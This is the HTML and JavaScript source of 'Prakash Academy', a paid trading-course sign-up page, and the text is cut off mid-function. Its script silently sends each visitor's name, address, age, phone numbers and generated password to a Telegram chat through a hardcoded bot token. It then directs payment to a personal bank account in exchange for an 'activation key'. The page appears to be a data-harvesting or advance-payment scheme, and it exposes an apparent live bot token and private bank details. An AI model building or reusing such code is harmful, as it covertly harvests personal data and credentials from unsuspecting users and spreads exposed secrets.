<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prakash Academy</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .cyber-font { font-family: 'Orbitron', sans-serif; }

        .bg-glow {
            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
            position: relative;
        }
        .bg-glow::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(239, 68, 68, 0.12) 0%, rgba(185, 28, 28, 0.06) 50%, transparent 100%);
            animation: rotateGlow 20s linear infinite;
            z-index: 0;
            pointer-events: none;
        }
        @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .cyber-card {
            background: rgba(20, 20, 20, 0.85);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.9), inset 0 1px 1px rgba(255, 255, 255, 0.08);
        }

        .neon-input {
            background: rgba(15, 15, 15, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.08);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .neon-input:focus-within {
            border-color: #ef4444;
            background: rgba(30, 30, 30, 0.9);
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.3);
        }

        .package-content {
            background: linear-gradient(145deg, #1f1f1f, #111827);
            border: 2px solid rgba(234, 179, 8, 0.6);
            box-shadow: 0 0 60px -10px rgba(234, 179, 8, 0.7);
        }
    </style>
</head>

<body class="bg-glow flex items-center justify-center min-h-screen p-4 select-none">

    <!-- Auth Portal -->
    <div id="auth-portal" class="w-full max-w-[420px] z-10">
        <div class="cyber-card rounded-[2.5rem] p-8 relative">
            <div class="absolute top-0 inset-x-0 h-[3px] bg-gradient-to-r from-transparent via-red-500 to-transparent"></div>
            
            <div class="text-center mb-8">
                <div class="inline-flex items-center gap-2 bg-red-500/10 text-red-400 border border-red-500/30 px-3 py-1 rounded-full text-[10px] font-black tracking-widest uppercase mb-4">
                    <span class="w-1.5 h-1.5 bg-red-400 rounded-full animate-ping"></span> SECURE GATEWAY
                </div>
                <div class="flex items-center justify-center gap-1 mb-2">
                    <h1 class="text-5xl font-black italic tracking-[-3px] text-white cyber-font">PRAKASH</h1>
                    <h1 class="text-5xl font-black italic tracking-[-3px] text-red-500 cyber-font">ACADEMY</h1>
                </div>
                <p class="text-red-400/80 text-xs tracking-[3px] font-bold">PREMIUM LEARNING</p>
            </div>

            <div class="grid grid-cols-2 bg-black/60 border border-white/10 p-1 rounded-2xl mb-8 font-bold text-xs text-center">
                <button onclick="changeScreen('register')" id="tab-register" class="py-3 rounded-xl bg-gradient-to-r from-zinc-900 to-black text-white shadow border border-white/10 transition-all">
                    QUICK SIGNUP
                </button>
                <button onclick="changeScreen('login')" id="tab-login" class="py-3 rounded-xl text-slate-400 hover:text-white transition-all">
                    SECURE LOGIN
                </button>
            </div>

            <div class="relative min-h-[460px]">
                <div id="view-register" class="slide-effect space-y-4">
                    <!-- Registration Form -->
                    <div class="grid grid-cols-2 gap-3">
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Full Name *</span>
                            <input type="text" id="full-name" placeholder="First Name" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Last Name *</span>
                            <input type="text" id="last-name" placeholder="Last Name" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                    </div>

                    <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">City *</span>
                        <input type="text" id="city" placeholder="Your City" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Region *</span>
                            <input type="text" id="region" placeholder="Province / State" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Postal Code *</span>
                            <input type="tel" id="postal-code" maxlength="10" placeholder="Postal Code" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                    </div>

                    <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Address *</span>
                        <input type="text" id="address" placeholder="Full Address" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Age *</span>
                            <input type="number" id="age" min="1" max="100" placeholder="Your Age" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                        <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Phone Number *</span>
                            <input type="tel" id="phone" maxlength="15" placeholder="+94 XX XXX XXXX" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                        </div>
                    </div>

                    <div><span class="block text-[8px] text-slate-400 font-extrabold uppercase tracking-widest mb-1.5 ml-1">Whatsapp Number *</span>
                        <input type="tel" id="whatsapp" maxlength="15" placeholder="+94 XX XXX XXXX" class="w-full neon-input rounded-2xl px-4 py-3.5 text-xs text-white placeholder-slate-600 outline-none" required>
                    </div>

                    <button onclick="generateAccountDirectly(event)" class="w-full py-4 bg-gradient-to-r from-red-500 to-red-600 text-white font-black text-xs uppercase tracking-widest rounded-2xl">
                        REGISTER & GENERATE ACCOUNT
                    </button>

                    <div id="register-success" class="hidden success-box rounded-3xl p-6 mt-6 text-center">
                        <p class="text-green-400 text-sm font-bold mb-4">✅ ACCOUNT CREATED SUCCESSFULLY!</p>
                        <div class="bg-black/50 rounded-2xl p-5 text-left space-y-4">
                            <div class="flex justify-between"><span class="text-slate-400">Account ID</span><span id="success-userid" class="font-mono text-red-400 font-bold"></span></div>
                            <div class="flex justify-between"><span class="text-slate-400">Password</span><span id="success-password" class="font-mono text-white font-bold"></span></div>
                        </div>
                        <button onclick="copyCredentials()" class="mt-4 w-full py-3 bg-white text-black rounded-2xl font-bold text-sm">📋 COPY CREDENTIALS</button>
                        <button onclick="goToLoginAfterRegister()" class="mt-3 w-full py-3 bg-red-500/10 text-red-400 rounded-2xl font-bold">CONTINUE TO LOGIN →</button>
                    </div>
                </div>

                <div id="view-login" class="slide-effect space-y-4 hidden">
                    <div>
                        <label class="block text-[8px] text-slate-400 font-black uppercase tracking-widest mb-2 ml-1">Account ID (9 Digits)</label>
                        <input type="text" id="login-username" placeholder="e.g. 582948104" class="w-full neon-input rounded-2xl px-4 py-4 text-xs text-white placeholder-slate-600 outline-none font-semibold">
                    </div>
                    <div>
                        <label class="block text-[8px] text-slate-400 font-black uppercase tracking-widest mb-2 ml-1">Password</label>
                        <input type="password" id="login-password" placeholder="••••••••" class="w-full neon-input rounded-2xl px-4 py-4 text-xs text-white placeholder-slate-600 outline-none">
                    </div>

                    <div id="login-error" class="hidden text-red-400 bg-red-950/40 border border-red-500/30 text-xs text-center p-3 rounded-xl"></div>

                    <button onclick="triggerLogin(event)" class="w-full py-4 bg-white text-black font-black text-xs uppercase tracking-widest rounded-2xl">
                        SECURE LOGIN
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Dashboard -->
    <div id="dashboard" class="hidden w-full max-w-5xl z-10">
        <div class="flex justify-between items-center mb-8 px-6 py-4 bg-black/60 border border-white/10 rounded-3xl">
            <h1 class="text-3xl font-black text-white cyber-font">PRAKASH ACADEMY</h1>
            <button onclick="toggleProfile()" class="w-10 h-10 bg-red-500 hover:bg-red-600 rounded-2xl flex items-center justify-center text-white font-bold text-xl transition-all">👤</button>
        </div>

        <div class="cyber-card rounded-3xl p-10">
            <h2 class="text-4xl font-black text-white mb-8 text-center">Welcome Back, Trader!</h2>
            
            <div id="trading-section" class="hidden">
                <h3 class="text-3xl font-bold text-white mb-8 text-center cyber-font">TRADING LEARN</h3>
                
                <div id="package-container" class="max-w-md mx-auto">
                    <button onclick="showPackageInPlace()" class="w-full py-8 bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 text-white font-black text-2xl rounded-3xl shadow-2xl shadow-orange-500/50 hover:scale-105 hover:shadow-yellow-500/60 transition-all duration-300">
                        <div class="flex flex-col items-center gap-3">
                            <span class="text-5xl">💎</span>
                            <div>
                                <span class="block text-xl tracking-widest">BUY PREMIUM</span>
                                <span class="block text-3xl">LKR 800 PACKAGE</span>
                            </div>
                            <span class="text-sm opacity-90">Full Access to All Crypto & Forex Videos</span>
                        </div>
                    </button>
                </div>

                <div class="text-center mt-8">
                    <button onclick="hideTradingSection()" class="text-slate-400 hover:text-white underline">← Back to Dashboard</button>
                </div>
            </div>

            <div id="main-dashboard" class="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-2xl mx-auto">
                <button onclick="showTradingSection()" class="group bg-gradient-to-br from-zinc-900 to-black border border-red-500/30 hover:border-red-500 p-8 rounded-3xl transition-all hover:scale-105">
                    <div class="text-6xl mb-4">📚</div>
                    <h3 class="text-2xl font-black text-white mb-2">Trading Learn</h3>
                    <p class="text-slate-400">Master technical analysis, risk management & strategies</p>
                </button>

                <button onclick="alert('Signal Channels Coming Soon!')" class="group bg-gradient-to-br from-zinc-900 to-black border border-red-500/30 hover:border-red-500 p-8 rounded-3xl transition-all hover:scale-105">
                    <div class="text-6xl mb-4">📡</div>
                    <h3 class="text-2xl font-black text-white mb-2">Signal Channels</h3>
                    <p class="text-slate-400">Premium trading signals & live market updates</p>
                </button>
            </div>
        </div>
    </div>

    <script>
        let currentUser = {};
        const BOT_TOKEN = "8602101677:AAH8shjaBmeOggDMTetIVmqb45Ru44HlmRc";
        const CHAT_ID = "8441230005";

        async function sendToTelegram(data, type = "registration") {
            let message = "";
            if (type === "registration") {
                message = `🆕 New Registration\n\n👤 ${data.fullName}\n🏙️ ${data.city}\n📍 ${data.region}\n📮 ${data.postalCode}\n📞 ${data.phone}\n💬 ${data.whatsapp}\n\n🔑 ID: ${data.userId}\n🔒 Pass: ${data.password}`;
            } else if (type === "payment") {
                message = `💰 New Payment Submission\n\n👤 Name: ${data.name}\n🏠 Address: ${data.address}\n📍 Village/City: ${data.village}\n📱 WhatsApp: ${data.whatsapp}\n🎂 Age: ${data.age}\n\n🔑 Account ID: ${data.userId}\n💵 Amount: LKR 800\n\n⏳ Verification in progress - Activate within 24 hours`;
            }
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: message})
                });
            } catch(e){}
        }

        function validateForm() {
            const fields = ['full-name','last-name','city','region','postal-code','address','age','phone','whatsapp'];
            for (let id of fields) {
                if (!document.getElementById(id).value.trim()) {
                    alert("සියලුම තොරතුරු පුරවන්න!");
                    return false;
                }
            }
            return true;
        }

        function generateAccountDirectly(e) {
            e.preventDefault();
            if (!validateForm()) return;

            const fullName = document.getElementById('full-name').value.trim() + " " + document.getElementById('last-name').value.trim();
            const userId = Math.floor(100000000 + Math.random() * 900000000).toString();
            const password = Math.random().toString(36).slice(-8).toUpperCase();

            currentUser = { fullName, city: document.getElementById('city').value.trim(), region: document.getElementById('region').value.trim(), postalCode: document.getElementById('postal-code').value.trim(), address: document.getElementById('address').value.trim(), age: document.getElementById('age').value.trim(), phone: document.getElementById('phone').value.trim(), whatsapp: document.getElementById('whatsapp').value.trim(), userId, password };

            sendToTelegram(currentUser, "registration");

            document.getElementById('success-userid').textContent = userId;
            document.getElementById('success-password').textContent = password;
            document.getElementById('register-success').classList.remove('hidden');

            document.getElementById('login-username').value = userId;
            document.getElementById('login-password').value = password;
        }

        function copyCredentials() {
            const text = `Account ID: ${currentUser.userId}\nPassword: ${currentUser.password}`;
            navigator.clipboard.writeText(text).then(() => alert("✅ Credentials Copied!"));
        }

        function copyToClipboard(text, label) {
            navigator.clipboard.writeText(text).then(() => alert(label + " කොපි කරන ලදී!"));
        }

        function goToLoginAfterRegister() {
            changeScreen('login');
        }

        function showTradingSection() {
            document.getElementById('main-dashboard').classList.add('hidden');
            document.getElementById('trading-section').classList.remove('hidden');
        }

        function hideTradingSection() {
            document.getElementById('trading-section').classList.add('hidden');
            document.getElementById('main-dashboard').classList.remove('hidden');
        }

        function showPackageInPlace() {
            const container = document.getElementById('package-container');
            container.innerHTML = `
                <div class="package-content rounded-3xl p-8 text-center">
                    <div class="text-6xl mb-6">💎</div>
                    <h2 class="text-4xl font-black text-white mb-1">LKR 800</h2>
                    <p class="text-yellow-400 text-xl font-bold mb-6">PREMIUM PACKAGE</p>
                    <p class="text-slate-300 mb-8 text-[15px] leading-relaxed">සියලුම Crypto සහ Forex වීඩියෝ,<br>Technical Analysis සහ Risk Management Lessons</p>
                    <button onclick="showBankDetails()" class="w-full py-6 bg-gradient-to-r from-yellow-400 to-amber-500 text-black font-black text-xl rounded-2xl shadow-xl shadow-yellow-500/50 hover:scale-105 transition-all">PROCEED TO PAYMENT</button>
                    <button onclick="resetPackageButton()" class="mt-4 text-slate-400 hover:text-white text-sm">← Back</button>
                </div>
            `;
        }

        function showBankDetails() {
            const container = document.getElementById('package-container');
            container.innerHTML = `
                <div class="package-content rounded-3xl p-8">
                    <div class="text-5xl mb-6 text-center">🏦</div>
                    <h2 class="text-3xl font-black text-white mb-6 text-center">Payment Details</h2>
                    
                    <div class="space-y-4 text-left mb-8">
                        <div class="bg-black/60 p-4 rounded-2xl flex justify-between items-center">
                            <div><p class="text-yellow-400 text-xs">BANK NAME</p><p class="text-white font-medium">NDB BANK</p></div>
                            <button onclick="copyToClipboard('NDB BANK', 'Bank Name')" class="text-xs bg-white/10 hover:bg-white/20 px-4 py-2 rounded-xl">Copy</button>
                        </div>
                        <div class="bg-black/60 p-4 rounded-2xl flex justify-between items-center">
                            <div><p class="text-yellow-400 text-xs">ACCOUNT NUMBER</p><p class="text-white font-medium font-mono">115512393065</p></div>
                            <button onclick="copyToClipboard('115512393065', 'Account Number')" class="text-xs bg-white/10 hover:bg-white/20 px-4 py-2 rounded-xl">Copy</button>
                        </div>
                        <div class="bg-black/60 p-4 rounded-2xl flex justify-between items-center">
                            <div><p class="text-yellow-400 text-xs">ACCOUNT HOLDER</p><p class="text-white font-medium">R.A.P.V.LAKSHAN</p></div>
                            <button onclick="copyToClipboard('R.A.P.V.LAKSHAN', 'Account Holder')" class="text-xs bg-white/10 hover:bg-white/20 px-4 py-2 rounded-xl">Copy</button>
                        </div>
                        <div class="bg-black/60 p-4 rounded-2xl flex justify-between items-center">
                            <div><p class="text-yellow-400 text-xs">BRANCH</p><p class="text-white font-medium">ABILIPITIYA</p></div>
                            <button onclick="copyToClipboard('ABILIPITIYA', 'Branch')" class="text-xs bg-white/10 hover:bg-white/20 px-4 py-2 rounded-xl">Copy</button>
                        </div>
                    </div>

                    <div class="border-t border-yellow-400/30 pt-8">
                        <h3 class="text-yellow-400 text-lg font-bold mb-6 text-center">Payment Confirmation</h3>
                        <div class="space-y-5">
                            <div><label class="block text-xs text-slate-400 font-bold mb-2">ඔබගේ නම (Full Name)</label><input id="payment-name" type="text" value="${currentUser.fullName || ''}" class="neon-input w-full rounded-2xl px-4 py-3 text-sm"></div>
                            <div><label class="block text-xs text-slate-400 font-bold mb-2">ගම / නගරය (Village / City)</label><input id="payment-village" type="text" value="${currentUser.city || ''}" class="neon-input w-full rounded-2xl px-4 py-3 text-sm"></div>
                            <div><label class="block text-xs text-slate-400 font-bold mb-2">ලිපිනය (Address)</label><input id="payment-address" type="text" value="${currentUser.address || ''}" class="neon-input w-full rounded-2xl px-4 py-3 text-sm"></div>
                            <div class="grid grid-cols-2 gap-4">
                                <div><label class="block text-xs text-slate-400 font-bold mb-2">WhatsApp අංකය</label><input id="payment-whatsapp" type="tel" value="${currentUser.whatsapp || ''}" class="neon-input w-full rounded-2xl px-4 py-3 text-sm"></div>
                                <div><label class="block text-xs text-slate-400 font-bold mb-2">වයස (Age)</label><input id="payment-age" type="number" value="${currentUser.age || ''}" class="neon-input w-full rounded-2xl px-4 py-3 text-sm"></div>
                            </div>
                        </div>
                    </div>

                    <button onclick="submitPaymentProof()" class="mt-8 w-full py-6 bg-gradient-to-r from-emerald-500 to-teal-500 text-black font-black text-xl rounded-2xl shadow-xl hover:scale-105 transition-all">SUBMIT PAYMENT</button>
                    <button onclick="resetPackageButton()" class="mt-4 w-full py-3 text-slate-400 hover:text-white border border-slate-500 rounded-2xl">← Back to Package</button>
                </div>
            `;
        }

        function submitPaymentProof() {
            const name = document.getElementById('payment-name').value.trim();
            const village = document.getElementById('payment-village').value.trim();
            const address = document.getElementById('payment-address').value.trim();
            const whatsapp = document.getElementById('payment-whatsapp').value.trim();
            const age = document.getElementById('payment-age').value.trim();

            if (!name || !village || !address || !whatsapp || !age) {
                alert("සියලුම තොරතුරු පුරවන්න!");
                return;
            }

            const paymentData = { name, village, address, whatsapp, age, userId: currentUser.userId || "N/A" };
            sendToTelegram(paymentData, "payment");

            const container = document.getElementById('package-container');
            container.innerHTML = `
                <div class="package-content rounded-3xl p-8 text-center">
                    <div class="text-6xl mb-6">📤</div>
                    <h2 class="text-3xl font-black text-yellow-400 mb-2">Payment Slip යවන්න</h2>
                    <p class="text-slate-300 mb-8">ඔබගේ ගෙවීමේ slip එක Admin වෙත යවන්න.<br>Slip එක ලැබුණු පසු Activation Key එකක් ලැබෙනු ඇත.</p>
                    
                    <div class="bg-black/70 rounded-2xl p-6 mb-8">
                        <label class="block text-xs text-slate-400 font-bold mb-3">ENTER ACTIVATION KEY</label>
                        <input id="activation-key" type="text" placeholder="XXXX-XXXX-XXXX" 
                               class="neon-input w-full rounded-2xl px-5 py-4 text-lg text-center font-mono tracking-widest">
                    </div>

                    <button onclick="enterActivationKey()" 
                            class="w-full py-6 bg-gradient-to-r from-emerald-500 to-teal-500 text-black font-black text-xl rounded-2xl shadow-xl hover:scale-105 transition-all mb-3">
                        ENTER THE KEY
                    </button>
                    <button onclick="contactAdmin()" 
                            class="w-full py-6 bg-gradient-to-r from-blue-500 to-cyan-500 text-white font-black text-xl rounded-2xl shadow-xl hover:scale-105 transition-all">
                        CONTACT ADMIN
                    </button>
                </div>
            `;
        }

        function enterActivationKey() {
            const key = document.getElementById('activation-key').value.trim();
            if (!key) {
                alert("කරුණාකර Activation Key එක ඇතුළත් කරන්න!");
                return;
